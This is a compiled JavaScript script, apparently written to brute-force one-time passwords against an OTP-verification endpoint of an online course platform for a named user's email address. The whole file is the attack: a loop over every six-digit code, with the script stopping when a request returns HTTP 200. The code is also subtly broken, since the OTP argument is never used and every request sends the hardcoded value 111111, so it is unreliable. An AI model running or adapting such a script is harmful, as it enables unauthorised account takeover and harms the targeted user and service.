"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
let atteck = (otp) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        let config = {
            method: 'get',
            maxBodyLength: Infinity,
            url: 'https://harkiratapi.classx.co.in/get/otpverify?useremail=barathraj048%40gmail.com&otp=111111&mydeviceid=&mydeviceid2=',
            headers: {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'auth-key': 'appxapi',
                'client-service': 'Appx',
                'device-type': '',
                'origin': 'https://harkirat.classx.co.in',
                'priority': 'u=1, i',
                'referer': 'https://harkirat.classx.co.in/',
                'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'source': 'website',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
            }
        };
        let res = yield axios_1.default.request(config);
        console.log(res.data);
        return res.status;
    }
    catch (e) {
        console.log(e);
    }
});
let bruteForce = () => __awaiter(void 0, void 0, void 0, function* () {
    for (let i = 100000; i < 999999; i++) {
        let status = yield atteck(i);
        if (status == 200) {
            console.log("Success");
            break;
        }
        else {
            console.log("Failed");
            console.log(status, "am retrying" + i);
        }
    }
});
bruteForce();
console.log("im working");
